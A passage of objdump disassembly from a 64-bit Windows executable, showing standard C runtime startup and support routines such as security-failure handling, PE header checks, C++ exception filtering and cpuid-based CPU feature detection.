   140003401:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140003407:	48 83 c0 08          	add    $0x8,%rax
   14000340b:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140003412:	e8 19 e4 00 00       	call   0x140011830
   140003417:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   14000341e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003423:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000342a:	40 
   14000342b:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140003432:	00 
   140003433:	ff 15 df fb 00 00    	call   *0xfbdf(%rip)        # 0x140013018
   140003439:	8b d8                	mov    %eax,%ebx
   14000343b:	33 c9                	xor    %ecx,%ecx
   14000343d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003442:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003447:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000344b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003450:	ff 15 12 fd 00 00    	call   *0xfd12(%rip)        # 0x140013168
   140003456:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000345b:	ff 15 ff fc 00 00    	call   *0xfcff(%rip)        # 0x140013160
   140003461:	85 c0                	test   %eax,%eax
   140003463:	75 0d                	jne    0x140003472
   140003465:	83 fb 01             	cmp    $0x1,%ebx
   140003468:	74 08                	je     0x140003472
   14000346a:	8d 48 03             	lea    0x3(%rax),%ecx
   14000346d:	e8 ba fe ff ff       	call   0x14000332c
   140003472:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140003479:	00 
   14000347a:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140003481:	5d                   	pop    %rbp
   140003482:	c3                   	ret
   140003483:	cc                   	int3
   140003484:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000348b:	33 d2                	xor    %edx,%edx
   14000348d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003492:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140003496:	e8 95 e3 00 00       	call   0x140011830
   14000349b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400034a0:	ff 15 ca fc 00 00    	call   *0xfcca(%rip)        # 0x140013170
   1400034a6:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   1400034ab:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400034b0:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   1400034b6:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400034bd:	c3                   	ret
   1400034be:	cc                   	int3
   1400034bf:	cc                   	int3
   1400034c0:	e9 f3 fd ff ff       	jmp    0x1400032b8
   1400034c5:	cc                   	int3
   1400034c6:	cc                   	int3
   1400034c7:	cc                   	int3
   1400034c8:	48 83 ec 28          	sub    $0x28,%rsp
   1400034cc:	33 c9                	xor    %ecx,%ecx
   1400034ce:	ff 15 ac fc 00 00    	call   *0xfcac(%rip)        # 0x140013180
   1400034d4:	48 85 c0             	test   %rax,%rax
   1400034d7:	74 3a                	je     0x140003513
   1400034d9:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400034de:	66 39 08             	cmp    %cx,(%rax)
   1400034e1:	75 30                	jne    0x140003513
   1400034e3:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400034e7:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   1400034ee:	75 23                	jne    0x140003513
   1400034f0:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400034f5:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400034fa:	75 17                	jne    0x140003513
   1400034fc:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140003503:	0e 
   140003504:	76 0d                	jbe    0x140003513
   140003506:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   14000350d:	00 
   14000350e:	0f 95 c0             	setne  %al
   140003511:	eb 02                	jmp    0x140003515
   140003513:	32 c0                	xor    %al,%al
   140003515:	48 83 c4 28          	add    $0x28,%rsp
   140003519:	c3                   	ret
   14000351a:	cc                   	int3
   14000351b:	cc                   	int3
   14000351c:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x14000352c
   140003523:	48 ff 25 3e fc 00 00 	rex.W jmp *0xfc3e(%rip)        # 0x140013168
   14000352a:	cc                   	int3
   14000352b:	cc                   	int3
   14000352c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003531:	57                   	push   %rdi
   140003532:	48 83 ec 20          	sub    $0x20,%rsp
   140003536:	48 8b 19             	mov    (%rcx),%rbx
   140003539:	48 8b f9             	mov    %rcx,%rdi
   14000353c:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140003542:	75 24                	jne    0x140003568
   140003544:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140003548:	75 1e                	jne    0x140003568
   14000354a:	8b 53 20             	mov    0x20(%rbx),%edx
   14000354d:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   140003553:	74 20                	je     0x140003575
   140003555:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   14000355b:	83 f8 01             	cmp    $0x1,%eax
   14000355e:	76 15                	jbe    0x140003575
   140003560:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140003566:	74 0d                	je     0x140003575
   140003568:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000356d:	33 c0                	xor    %eax,%eax
   14000356f:	48 83 c4 20          	add    $0x20,%rsp
   140003573:	5f                   	pop    %rdi
   140003574:	c3                   	ret
   140003575:	e8 de 06 00 00       	call   0x140003c58
   14000357a:	48 89 18             	mov    %rbx,(%rax)
   14000357d:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140003581:	e8 e6 06 00 00       	call   0x140003c6c
   140003586:	48 89 18             	mov    %rbx,(%rax)
   140003589:	e8 22 41 00 00       	call   0x1400076b0
   14000358e:	cc                   	int3
   14000358f:	cc                   	int3
   140003590:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003595:	57                   	push   %rdi
   140003596:	48 83 ec 20          	sub    $0x20,%rsp
   14000359a:	48 8d 1d 97 7e 01 00 	lea    0x17e97(%rip),%rbx        # 0x14001b438
   1400035a1:	48 8d 3d 90 7e 01 00 	lea    0x17e90(%rip),%rdi        # 0x14001b438
   1400035a8:	eb 12                	jmp    0x1400035bc
   1400035aa:	48 8b 03             	mov    (%rbx),%rax
   1400035ad:	48 85 c0             	test   %rax,%rax
   1400035b0:	74 06                	je     0x1400035b8
   1400035b2:	ff 15 b0 fd 00 00    	call   *0xfdb0(%rip)        # 0x140013368
   1400035b8:	48 83 c3 08          	add    $0x8,%rbx
   1400035bc:	48 3b df             	cmp    %rdi,%rbx
   1400035bf:	72 e9                	jb     0x1400035aa
   1400035c1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035c6:	48 83 c4 20          	add    $0x20,%rsp
   1400035ca:	5f                   	pop    %rdi
   1400035cb:	c3                   	ret
   1400035cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400035d1:	57                   	push   %rdi
   1400035d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400035d6:	48 8d 1d 6b 7e 01 00 	lea    0x17e6b(%rip),%rbx        # 0x14001b448
   1400035dd:	48 8d 3d 64 7e 01 00 	lea    0x17e64(%rip),%rdi        # 0x14001b448
   1400035e4:	eb 12                	jmp    0x1400035f8
   1400035e6:	48 8b 03             	mov    (%rbx),%rax
   1400035e9:	48 85 c0             	test   %rax,%rax
   1400035ec:	74 06                	je     0x1400035f4
   1400035ee:	ff 15 74 fd 00 00    	call   *0xfd74(%rip)        # 0x140013368
   1400035f4:	48 83 c3 08          	add    $0x8,%rbx
   1400035f8:	48 3b df             	cmp    %rdi,%rbx
   1400035fb:	72 e9                	jb     0x1400035e6
   1400035fd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003602:	48 83 c4 20          	add    $0x20,%rsp
   140003606:	5f                   	pop    %rdi
   140003607:	c3                   	ret
   140003608:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000360d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003612:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003617:	57                   	push   %rdi
   140003618:	48 83 ec 10          	sub    $0x10,%rsp
   14000361c:	33 c0                	xor    %eax,%eax
   14000361e:	33 c9                	xor    %ecx,%ecx
   140003620:	0f a2                	cpuid
   140003622:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140003628:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   14000362e:	0b d1                	or     %ecx,%edx
   140003630:	8b e8                	mov    %eax,%ebp
   140003632:	b8 01 00 00 00       	mov    $0x1,%eax
   140003637:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   14000363d:	0b d3                	or     %ebx,%edx
   14000363f:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140003642:	0f a2                	cpuid
   140003644:	8b f9                	mov    %ecx,%edi
   140003646:	75 5e                	jne    0x1400036a6
   140003648:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000364d:	48 c7 05 c0 a9 01 00 	movq   $0x8000,0x1a9c0(%rip)        # 0x14001e018
   140003654:	00 80 00 00 
   140003658:	48 c7 05 bd a9 01 00 	movq   $0xffffffffffffffff,0x1a9bd(%rip)        # 0x14001e020
   14000365f:	ff ff ff ff 
   140003663:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140003668:	74 28                	je     0x140003692
   14000366a:	3d 60 06 02 00       	cmp    $0x20660,%eax
   14000366f:	74 21                	je     0x140003692
   140003671:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140003676:	74 1a                	je     0x140003692
   140003678:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   14000367d:	83 f8 20             	cmp    $0x20,%eax
   140003680:	77 24                	ja     0x1400036a6
   140003682:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140003689:	00 00 00 
   14000368c:	48 0f a3 c1          	bt     %rax,%rcx
   140003690:	73 14                	jae    0x1400036a6
   140003692:	44 8b 05 df b4 01 00 	mov    0x1b4df(%rip),%r8d        # 0x14001eb78
   140003699:	41 83 c8 01          	or     $0x1,%r8d
   14000369d:	44 89 05 d4 b4 01 00 	mov    %r8d,0x1b4d4(%rip)        # 0x14001eb78
   1400036a4:	eb 07                	jmp    0x1400036ad
   1400036a6:	44 8b 05 cb b4 01 00 	mov    0x1b4cb(%rip),%r8d        # 0x14001eb78
   1400036ad:	45 33 c9             	xor    %r9d,%r9d
   1400036b0:	41 8b f1             	mov    %r9d,%esi
   1400036b3:	45 8b d1             	mov    %r9d,%r10d
   1400036b6:	45 8b d9             	mov    %r9d,%r11d
   1400036b9:	83 fd 07             	cmp    $0x7,%ebp
   1400036bc:	7c 40                	jl     0x1400036fe
   1400036be:	41 8d 41 07          	lea    0x7(%r9),%eax
   1400036c2:	33 c9                	xor    %ecx,%ecx
   1400036c4:	0f a2                	cpuid
   1400036c6:	8b f2                	mov    %edx,%esi
   1400036c8:	44 8b cb             	mov    %ebx,%r9d
   1400036cb:	0f ba e3 09          	bt     $0x9,%ebx
   1400036cf:	73 0b                	jae    0x1400036dc
   1400036d1:	41 83 c8 02          	or     $0x2,%r8d
   1400036d5:	44 89 05 9c b4 01 00 	mov    %r8d,0x1b49c(%rip)        # 0x14001eb78
   1400036dc:	83 f8 01             	cmp    $0x1,%eax
   1400036df:	7c 0d                	jl     0x1400036ee
   1400036e1:	b8 07 00 00 00       	mov    $0x7,%eax
   1400036e6:	8d 48 fa             	lea    -0x6(%rax),%ecx
   1400036e9:	0f a2                	cpuid
   1400036eb:	44 8b d2             	mov    %edx,%r10d
   1400036ee:	b8 24 00 00 00       	mov    $0x24,%eax
   1400036f3:	3b e8                	cmp    %eax,%ebp
   1400036f5:	7c 07                	jl     0x1400036fe
   1400036f7:	33 c9                	xor    %ecx,%ecx
   1400036f9:	0f a2                	cpuid
   1400036fb:	44 8b db             	mov    %ebx,%r11d
   1400036fe:	48 8b 05 03 a9 01 00 	mov    0x1a903(%rip),%rax        # 0x14001e008
   140003705:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140003709:	c7 05 fd a8 01 00 01 	movl   $0x1,0x1a8fd(%rip)        # 0x14001e010
   140003710:	00 00 00 
   140003713:	c7 05 f7 a8 01 00 02 	movl   $0x2,0x1a8f7(%rip)        # 0x14001e014
   14000371a:	00 00 00 
   14000371d:	48 89 05 e4 a8 01 00 	mov    %rax,0x1a8e4(%rip)        # 0x14001e008
   140003724:	0f ba e7 14          	bt     $0x14,%edi
   140003728:	73 1f                	jae    0x140003749
   14000372a:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   14000372e:	c7 05 d8 a8 01 00 02 	movl   $0x2,0x1a8d8(%rip)        # 0x14001e010
   140003735:	00 00 00 
   140003738:	48 89 05 c9 a8 01 00 	mov    %rax,0x1a8c9(%rip)        # 0x14001e008
   14000373f:	c7 05 cb a8 01 00 06 	movl   $0x6,0x1a8cb(%rip)        # 0x14001e014
   140003746:	00 00 00 
   140003749:	0f ba e7 1b          	bt     $0x1b,%edi
   14000374d:	0f 83 33 01 00 00    	jae    0x140003886
   140003753:	33 c9                	xor    %ecx,%ecx
   140003755:	0f 01 d0             	xgetbv
   140003758:	48 c1 e2 20          	shl    $0x20,%rdx
   14000375c:	48 0b d0             	or     %rax,%rdx
   14000375f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003764:	0f ba e7 1c          	bt     $0x1c,%edi
   140003768:	0f 83 fc 00 00 00    	jae    0x14000386a
   14000376e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003773:	24 06                	and    $0x6,%al
   140003775:	3c 06                	cmp    $0x6,%al
   140003777:	0f 85 ed 00 00 00    	jne    0x14000386a
   14000377d:	8b 05 91 a8 01 00    	mov    0x1a891(%rip),%eax        # 0x14001e014
   140003783:	b2 e0                	mov    $0xe0,%dl
   140003785:	83 c8 08             	or     $0x8,%eax
   140003788:	c7 05 7e a8 01 00 03 	movl   $0x3,0x1a87e(%rip)        # 0x14001e010
   14000378f:	00 00 00 
   140003792:	89 05 7c a8 01 00    	mov    %eax,0x1a87c(%rip)        # 0x14001e014
   140003798:	41 f6 c1 20          	test   $0x20,%r9b
   14000379c:	74 62                	je     0x140003800
   14000379e:	83 c8 20             	or     $0x20,%eax
   1400037a1:	c7 05 65 a8 01 00 05 	movl   $0x5,0x1a865(%rip)        # 0x14001e010
   1400037a8:	00 00 00 
   1400037ab:	89 05 63 a8 01 00    	mov    %eax,0x1a863(%rip)        # 0x14001e014
   1400037b1:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   1400037b6:	48 8b 05 4b a8 01 00 	mov    0x1a84b(%rip),%rax        # 0x14001e008
   1400037bd:	44 23 c9             	and    %ecx,%r9d
   1400037c0:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   1400037c4:	48 89 05 3d a8 01 00 	mov    %rax,0x1a83d(%rip)        # 0x14001e008
   1400037cb:	44 3b c9             	cmp    %ecx,%r9d
   1400037ce:	75 37                	jne    0x140003807
   1400037d0:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400037d5:	22 c2                	and    %dl,%al
   1400037d7:	3a c2                	cmp    %dl,%al
   1400037d9:	75 25                	jne    0x140003800
   1400037db:	48 8b 05 26 a8 01 00 	mov    0x1a826(%rip),%rax        # 0x14001e008
   1400037e2:	83 0d 2b a8 01 00 40 	orl    $0x40,0x1a82b(%rip)        # 0x14001e014
   1400037e9:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   1400037ed:	c7 05 19 a8 01 00 06 	movl   $0x6,0x1a819(%rip)        # 0x14001e010
   1400037f4:	00 00 00 
   1400037f7:	48 89 05 0a a8 01 00 	mov    %rax,0x1a80a(%rip)        # 0x14001e008
   1400037fe:	eb 07                	jmp    0x140003807
   140003800:	48 8b 05 01 a8 01 00 	mov    0x1a801(%rip),%rax        # 0x14001e008
   140003807:	0f ba e6 17          	bt     $0x17,%esi
   14000380b:	73 0c                	jae    0x140003819
   14000380d:	48 0f ba f0 18       	btr    $0x18,%rax
   140003812:	48 89 05 ef a7 01 00 	mov    %rax,0x1a7ef(%rip)        # 0x14001e008
   140003819:	41 0f ba e2 13       	bt     $0x13,%r10d
   14000381e:	73 4a                	jae    0x14000386a
   140003820:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003825:	22 c2                	and    %dl,%al
   140003827:	3a c2                	cmp    %dl,%al
   140003829:	75 3f                	jne    0x14000386a
   14000382b:	41 8b cb             	mov    %r11d,%ecx
   14000382e:	41 8b c3             	mov    %r11d,%eax
   140003831:	48 c1 e9 10          	shr    $0x10,%rcx
   140003835:	25 ff 00 04 00       	and    $0x400ff,%eax
   14000383a:	83 e1 06             	and    $0x6,%ecx
   14000383d:	89 05 31 b3 01 00    	mov    %eax,0x1b331(%rip)        # 0x14001eb74
   140003843:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   14000384a:	48 f7 d1             	not    %rcx
   14000384d:	48 23 0d b4 a7 01 00 	and    0x1a7b4(%rip),%rcx        # 0x14001e008
   140003854:	48 89 0d ad a7 01 00 	mov    %rcx,0x1a7ad(%rip)        # 0x14001e008
   14000385b:	3c 01                	cmp    $0x1,%al
   14000385d:	76 0b                	jbe    0x14000386a
   14000385f:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140003863:	48 89 0d 9e a7 01 00 	mov    %rcx,0x1a79e(%rip)        # 0x14001e008
   14000386a:	41 0f ba e2 15       	bt     $0x15,%r10d
   14000386f:	73 15                	jae    0x140003886
   140003871:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003876:	48 0f ba e0 13       	bt     $0x13,%rax
   14000387b:	73 09                	jae    0x140003886
   14000387d:	48 0f ba 35 82 a7 01 	btrq   $0x7,0x1a782(%rip)        # 0x14001e008
   140003884:	00 07 
   140003886:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000388b:	33 c0                	xor    %eax,%eax
   14000388d:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140003892:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003897:	48 83 c4 10          	add    $0x10,%rsp
   14000389b:	5f                   	pop    %rdi
   14000389c:	c3                   	ret
   14000389d:	cc                   	int3
   14000389e:	cc                   	int3
   14000389f:	cc                   	int3
   1400038a0:	33 c0                	xor    %eax,%eax
   1400038a2:	39 05 e8 c2 01 00    	cmp    %eax,0x1c2e8(%rip)        # 0x14001fb90
   1400038a8:	0f 95 c0             	setne  %al
   1400038ab:	c3                   	ret
   1400038ac:	cc                   	int3
   1400038ad:	cc                   	int3
   1400038ae:	cc                   	int3
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400038ba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400038bf:	57                   	push   %rdi
   1400038c0:	41 54                	push   %r12
   1400038c2:	41 55                	push   %r13
   1400038c4:	41 56                	push   %r14
   1400038c6:	41 57                	push   %r15
   1400038c8:	48 83 ec 40          	sub    $0x40,%rsp
   1400038cc:	48 8b f1             	mov    %rcx,%rsi
   1400038cf:	4d 8b f9             	mov    %r9,%r15
   1400038d2:	49 8b c8             	mov    %r8,%rcx
   1400038d5:	49 8b e8             	mov    %r8,%rbp
   1400038d8:	4c 8b ea             	mov    %rdx,%r13
   1400038db:	e8 14 04 00 00       	call   0x140003cf4
   1400038e0:	4d 8b 67 08          	mov    0x8(%r15),%r12
   1400038e4:	4d 8b 37             	mov    (%r15),%r14
   1400038e7:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   1400038eb:	4d 2b f4             	sub    %r12,%r14
   1400038ee:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   1400038f2:	41 8b 7f 48          	mov    0x48(%r15),%edi
   1400038f6:	0f 85 f1 00 00 00    	jne    0x1400039ed
   1400038fc:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003901:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140003906:	e9 ce 00 00 00       	jmp    0x1400039d9
   14000390b:	8b cf                	mov    %edi,%ecx
   14000390d:	48 03 c9             	add    %rcx,%rcx
   140003910:	8b ef                	mov    %edi,%ebp
   140003912:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140003916:	4c 3b f0             	cmp    %rax,%r14
   140003919:	0f 82 b8 00 00 00    	jb     0x1400039d7
   14000391f:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140003923:	4c 3b f0             	cmp    %rax,%r14
   140003926:	0f 83 ab 00 00 00    	jae    0x1400039d7
   14000392c:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   140003931:	0f 84 a0 00 00 00    	je     0x1400039d7
   140003937:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   14000393c:	74 1b                	je     0x140003959
   14000393e:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140003942:	49 8b d5             	mov    %r13,%rdx
   140003945:	49 03 c4             	add    %r12,%rax
   140003948:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000394d:	ff d0                	call   *%rax
   14000394f:	85 c0                	test   %eax,%eax
   140003951:	0f 88 8f 00 00 00    	js     0x1400039e6
   140003957:	7e 7e                	jle    0x1400039d7
   140003959:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   14000395f:	75 28                	jne    0x140003989
   140003961:	48 83 3d 77 fc 00 00 	cmpq   $0x0,0xfc77(%rip)        # 0x1400135e0
   140003968:	00 
   140003969:	74 1e                	je     0x140003989
   14000396b:	48 8d 0d 6e fc 00 00 	lea    0xfc6e(%rip),%rcx        # 0x1400135e0
   140003972:	e8 79 d2 00 00       	call   0x140010bf0
   140003977:	85 c0                	test   %eax,%eax
   140003979:	74 0e                	je     0x140003989
   14000397b:	ba 01 00 00 00       	mov    $0x1,%edx
   140003980:	48 8b ce             	mov    %rsi,%rcx
   140003983:	ff 15 57 fc 00 00    	call   *0xfc57(%rip)        # 0x1400135e0
   140003989:	48 8d 45 01          	lea    0x1(%rbp),%rax
   14000398d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003993:	48 03 c0             	add    %rax,%rax
   140003996:	49 8b d5             	mov    %r13,%rdx
   140003999:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   14000399c:	49 03 cc             	add    %r12,%rcx
   14000399f:	e8 1c 03 00 00       	call   0x140003cc0
   1400039a4:	44 8b 0e             	mov    (%rsi),%r9d
   1400039a7:	48 8d 45 01          	lea    0x1(%rbp),%rax
   1400039ab:	48 03 c0             	add    %rax,%rax
   1400039ae:	4c 8b c6             	mov    %rsi,%r8
   1400039b1:	49 8b cd             	mov    %r13,%rcx
   1400039b4:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   1400039b7:	49 8b 47 40          	mov    0x40(%r15),%rax
   1400039bb:	49 03 d4             	add    %r12,%rdx
   1400039be:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039c3:	49 8b 47 28          	mov    0x28(%r15),%rax
   1400039c7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400039cc:	ff 15 b6 f7 00 00    	call   *0xf7b6(%rip)        # 0x140013188
   1400039d2:	e8 19 03 00 00       	call   0x140003cf0
   1400039d7:	ff c7                	inc    %edi
   1400039d9:	3b 3b                	cmp    (%rbx),%edi
   1400039db:	0f 82 2a ff ff ff    	jb     0x14000390b
   1400039e1:	e9 be 00 00 00       	jmp    0x140003aa4
   1400039e6:	33 c0                	xor    %eax,%eax
   1400039e8:	e9 bc 00 00 00       	jmp    0x140003aa9
   1400039ed:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   1400039f1:	49 2b ec             	sub    %r12,%rbp
   1400039f4:	e9 9f 00 00 00       	jmp    0x140003a98
   1400039f9:	44 8b cf             	mov    %edi,%r9d
   1400039fc:	4d 03 c9             	add    %r9,%r9
   1400039ff:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   140003a04:	4c 3b f0             	cmp    %rax,%r14
   140003a07:	0f 82 89 00 00 00    	jb     0x140003a96
   140003a0d:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   140003a12:	4c 3b f0             	cmp    %rax,%r14
   140003a15:	73 7f                	jae    0x140003a96
   140003a17:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140003a1b:	74 3f                	je     0x140003a5c
   140003a1d:	33 d2                	xor    %edx,%edx
   140003a1f:	45 85 c0             	test   %r8d,%r8d
   140003a22:	74 34                	je     0x140003a58
   140003a24:	8b ca                	mov    %edx,%ecx
   140003a26:	48 03 c9             	add    %rcx,%rcx
   140003a29:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140003a2d:	48 3b e8             	cmp    %rax,%rbp
   140003a30:	72 1f                	jb     0x140003a51
   140003a32:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140003a36:	48 3b e8             	cmp    %rax,%rbp
   140003a39:	73 16                	jae    0x140003a51
   140003a3b:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   140003a40:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   140003a44:	75 0b                	jne    0x140003a51
   140003a46:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   140003a4b:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140003a4f:	74 07                	je     0x140003a58
   140003a51:	ff c2                	inc    %edx
   140003a53:	41 3b d0             	cmp    %r8d,%edx
   140003a56:	72 cc                	jb     0x140003a24
   140003a58:	3b 13                	cmp    (%rbx),%edx
   140003a5a:	75 48                	jne    0x140003aa4
   140003a5c:	8b c7                	mov    %edi,%eax
   140003a5e:	48 ff c0             	inc    %rax
   140003a61:	8b cf                	mov    %edi,%ecx
   140003a63:	48 03 c0             	add    %rax,%rax
   140003a66:	48 03 c9             	add    %rcx,%rcx
   140003a69:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   140003a6d:	74 10                	je     0x140003a7f
   140003a6f:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140003a72:	48 3b e8             	cmp    %rax,%rbp
   140003a75:	75 1f                	jne    0x140003a96
   140003a77:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140003a7b:	75 27                	jne    0x140003aa4
   140003a7d:	eb 17                	jmp    0x140003a96
   140003a7f:	8d 47 01             	lea    0x1(%rdi),%eax
   140003a82:	49 8b d5             	mov    %r13,%rdx
   140003a85:	41 89 47 48          	mov    %eax,0x48(%r15)
   140003a89:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140003a8e:	b1 01                	mov    $0x1,%cl
   140003a90:	4d 03 c4             	add    %r12,%r8
   140003a93:	41 ff d0             	call   *%r8
   140003a96:	ff c7                	inc    %edi
   140003a98:	44 8b 03             	mov    (%rbx),%r8d
   140003a9b:	41 3b f8             	cmp    %r8d,%edi
   140003a9e:	0f 82 55 ff ff ff    	jb     0x1400039f9
   140003aa4:	b8 01 00 00 00       	mov    $0x1,%eax
   140003aa9:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140003aae:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003ab2:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140003ab6:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003aba:	49 8b e3             	mov    %r11,%rsp
   140003abd:	41 5f                	pop    %r15
   140003abf:	41 5e                	pop    %r14
   140003ac1:	41 5d                	pop    %r13
   140003ac3:	41 5c                	pop    %r12
   140003ac5:	5f                   	pop    %rdi
   140003ac6:	c3                   	ret
   140003ac7:	cc                   	int3
   140003ac8:	48 83 ec 28          	sub    $0x28,%rsp
   140003acc:	e8 d3 03 00 00       	call   0x140003ea4
   140003ad1:	84 c0                	test   %al,%al
   140003ad3:	75 04                	jne    0x140003ad9
   140003ad5:	32 c0                	xor    %al,%al
   140003ad7:	eb 12                	jmp    0x140003aeb
   140003ad9:	e8 56 03 00 00       	call   0x140003e34
   140003ade:	84 c0                	test   %al,%al
   140003ae0:	75 07                	jne    0x140003ae9
   140003ae2:	e8 05 04 00 00       	call   0x140003eec
   140003ae7:	eb ec                	jmp    0x140003ad5
   140003ae9:	b0 01                	mov    $0x1,%al
   140003aeb:	48 83 c4 28          	add    $0x28,%rsp
   140003aef:	c3                   	ret
   140003af0:	48 83 ec 28          	sub    $0x28,%rsp
   140003af4:	84 c9                	test   %cl,%cl
   140003af6:	75 0a                	jne    0x140003b02
   140003af8:	e8 7f 03 00 00       	call   0x140003e7c
   140003afd:	e8 ea 03 00 00       	call   0x140003eec
   140003b02:	b0 01                	mov    $0x1,%al
   140003b04:	48 83 c4 28          	add    $0x28,%rsp
   140003b08:	c3                   	ret
   140003b09:	cc                   	int3
   140003b0a:	cc                   	int3
   140003b0b:	cc                   	int3
   140003b0c:	48 3b ca             	cmp    %rdx,%rcx
   140003b0f:	75 03                	jne    0x140003b14
   140003b11:	33 c0                	xor    %eax,%eax
   140003b13:	c3                   	ret
